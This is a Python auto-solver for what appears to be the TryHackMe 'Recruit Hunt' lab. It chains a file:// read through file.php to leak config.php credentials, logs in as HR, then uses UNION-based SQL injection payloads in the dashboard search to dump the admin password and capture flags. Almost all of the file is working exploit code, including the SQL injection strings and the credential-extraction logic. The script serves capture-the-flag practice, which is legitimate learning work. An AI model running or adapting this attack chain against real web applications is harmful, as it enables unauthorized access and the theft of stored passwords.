#!/usr/bin/env python3
"""TryHackMe Recruit Hunt auto-solver.

Exploit chain:
1) Read /var/www/html/config.php through /file.php?cv=file://...
2) Extract HR password from config and login on /
3) Get user flag from dashboard
4) SQL injection in dashboard search to dump admin password from users table
5) Login as admin and get admin flag
"""

from __future__ import annotations

import argparse
import re
import urllib.parse

import requests

FLAG_RE = re.compile(r"THM\{[^}]+\}")
HR_PASS_RE = re.compile(r"\$HR_PASSWORD\s*=\s*'([^']+)'", re.IGNORECASE)
DASHBOARD_PATH = "/dashboard.php"


def safe_request(method: str, url: str, timeout: int, **kwargs) -> requests.Response:
    try:
        response = requests.request(method=method, url=url, timeout=timeout, **kwargs)
        response.raise_for_status()
        return response
    except requests.RequestException as exc:
        raise RuntimeError(f"HTTP request failed: {method} {url} -> {exc}") from exc


def build_url(base: str, path: str) -> str:
    return f"{base.rstrip('/')}{path}"


def fetch_local_file(base: str, local_path: str, timeout: int) -> str:
    target = f"file://{local_path}"
    q = urllib.parse.quote(target, safe="")
    r = safe_request("GET", build_url(base, f"/file.php?cv={q}"), timeout)
    return r.text


def login(session: requests.Session, base: str, username: str, password: str, timeout: int) -> bool:
    payload = {
        "username": username,
        "password": password,
        "login": "Login",
    }
    try:
        r = session.post(build_url(base, "/"), data=payload, allow_redirects=True, timeout=timeout)
        r.raise_for_status()
    except requests.RequestException:
        return False

    if DASHBOARD_PATH in r.url.lower() and "invalid credentials" not in r.text.lower():
        return True

    try:
        d = session.get(build_url(base, DASHBOARD_PATH), allow_redirects=True, timeout=timeout)
        d.raise_for_status()
    except requests.RequestException:
        return False
    return (
        DASHBOARD_PATH in d.url.lower()
        and "candidate applications" in d.text.lower()
        and "invalid credentials" not in d.text.lower()
    )


def extract_first_flag(text: str) -> str | None:
    hits = FLAG_RE.findall(text or "")
    return hits[0] if hits else None


def extract_admin_password_via_sqli(session: requests.Session, base: str, timeout: int) -> str | None:
    payload = "' UNION SELECT 1,username,password,4 FROM users -- -"
    q = urllib.parse.quote_plus(payload)
    url = build_url(base, f"/dashboard.php?search={q}")
    try:
        r = session.get(url, timeout=timeout)
        r.raise_for_status()
    except requests.RequestException as exc:
        raise RuntimeError(f"SQLi request failed for primary payload: {exc}") from exc

    # Row format in this lab: <td>1</td><td>admin</td><td>admin_password</td><td>4</td>
    m = re.search(
        r"<td>\s*1\s*</td>\s*<td>\s*admin\s*</td>\s*<td>\s*([^<\s]+)\s*</td>\s*<td>\s*4\s*</td>",
        r.text,
        flags=re.IGNORECASE | re.DOTALL,
    )
    if m:
        return m.group(1).strip()

    # Fallback: group_concat payload result "admin:<password>" inside the name column.
    payload2 = "' UNION SELECT 1,group_concat(username,0x3a,password),3,4 FROM users -- -"
    q2 = urllib.parse.quote_plus(payload2)
    try:
        r2 = session.get(build_url(base, f"/dashboard.php?search={q2}"), timeout=timeout)
        r2.raise_for_status()
    except requests.RequestException as exc:
        raise RuntimeError(f"SQLi request failed for fallback payload: {exc}") from exc
    m2 = re.search(r"admin:([^,\n<\s]+)", r2.text)
    if m2:
        return m2.group(1)

    return None


def run(base: str, timeout: int) -> tuple[str | None, str | None]:
    print("=" * 64)
    print("Recruit Hunt Solver")
    print(f"Target: {base}")
    print("=" * 64)

    print("\n[1] Reading config through file.php SSRF...")
    config_text = fetch_local_file(base, "/var/www/html/config.php", timeout)
    hr_match = HR_PASS_RE.search(config_text)
    if not hr_match:
        raise RuntimeError("Could not extract HR password from config.php")
    hr_password = hr_match.group(1)
    print(f"    HR password found: {hr_password}")

    print("\n[2] Logging in as hr...")
    hr_session = requests.Session()
    ok = login(hr_session, base, "hr", hr_password, timeout)
    if not ok:
        raise RuntimeError("HR login failed")

    hr_dash = safe_request("GET", build_url(base, DASHBOARD_PATH), timeout, cookies=hr_session.cookies)
    user_flag = extract_first_flag(hr_dash.text)
    print(f"    User flag: {user_flag or 'not found'}")

    print("\n[3] Dumping admin password via SQL injection in search...")
    admin_password = extract_admin_password_via_sqli(hr_session, base, timeout)
    if not admin_password:
        raise RuntimeError("Could not extract admin password via SQLi")
    print(f"    Admin password found: {admin_password}")

    print("\n[4] Logging in as admin...")
    admin_session = requests.Session()
    ok_admin = login(admin_session, base, "admin", admin_password, timeout)
    if not ok_admin:
        raise RuntimeError("Admin login failed")

    admin_dash = safe_request("GET", build_url(base, DASHBOARD_PATH), timeout, cookies=admin_session.cookies)
    admin_flag = extract_first_flag(admin_dash.text)
    print(f"    Admin flag: {admin_flag or 'not found'}")

    print("\n" + "=" * 64)
    print("RESULT")
    print("=" * 64)
    print(f"Normal user flag: {user_flag or 'not found'}")
    print(f"Admin flag      : {admin_flag or 'not found'}")

    return user_flag, admin_flag


def main() -> None:
    parser = argparse.ArgumentParser(description="Recruit Hunt auto-solver")
    parser.add_argument("--target", default="http://10.113.187.4", help="Target base URL")
    parser.add_argument("--timeout", type=int, default=10, help="HTTP timeout in seconds")
    args = parser.parse_args()

    run(args.target.rstrip("/"), args.timeout)


if __name__ == "__main__":
    main()
